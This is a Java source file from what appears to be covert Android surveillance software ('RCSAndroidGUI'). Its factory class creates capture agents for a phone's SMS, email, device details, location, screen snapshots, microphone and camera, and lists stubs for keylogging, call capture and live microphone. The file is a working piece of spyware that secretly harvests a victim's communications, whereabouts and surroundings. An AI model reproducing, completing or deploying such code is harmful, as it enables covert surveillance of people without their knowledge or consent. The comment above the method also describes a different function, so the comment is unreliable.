package com.ht.RCSAndroidGUI.agent;

import com.ht.RCSAndroidGUI.interfaces.AbstractFactory;

import android.util.Log;

public class AgentFactory implements AbstractFactory<AgentBase,AgentType> {
	private static final String TAG = "AgentFactory";

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public AgentBase create(AgentType type) {
		AgentBase a = null;

		switch (type) {
			case AGENT_SMS:
				a = new MessageAgent();
				break;

			case AGENT_TASK:
				break;

			case AGENT_CALLLIST:
				break;

			case AGENT_DEVICE:
				a = new DeviceAgent();
				break;

			case AGENT_POSITION:
				a = new PositionAgent();
				break;

			case AGENT_CALL:
				break;

			case AGENT_CALL_LOCAL:
				break;

			case AGENT_KEYLOG:
				break;

			case AGENT_SNAPSHOT:
				a = new SnapshotAgent();
				break;

			case AGENT_URL:
				break;

			case AGENT_IM:
				break;

			case AGENT_EMAIL:
				a = new MessageAgent();
				break;

			case AGENT_MIC:
				a = new MicAgent();
				break;

			case AGENT_CAM:
				a = new CameraAgent();
				break;

			case AGENT_CLIPBOARD:
				break;

			case AGENT_CRISIS:
				a = new CrisisAgent();
				break;

			case AGENT_APPLICATION:
				break;

			case AGENT_LIVEMIC:
				break;

			default:
				Log.d("QZ", TAG + " Error (factory): unknown type");
				break;
		}

		return a;
	}

}
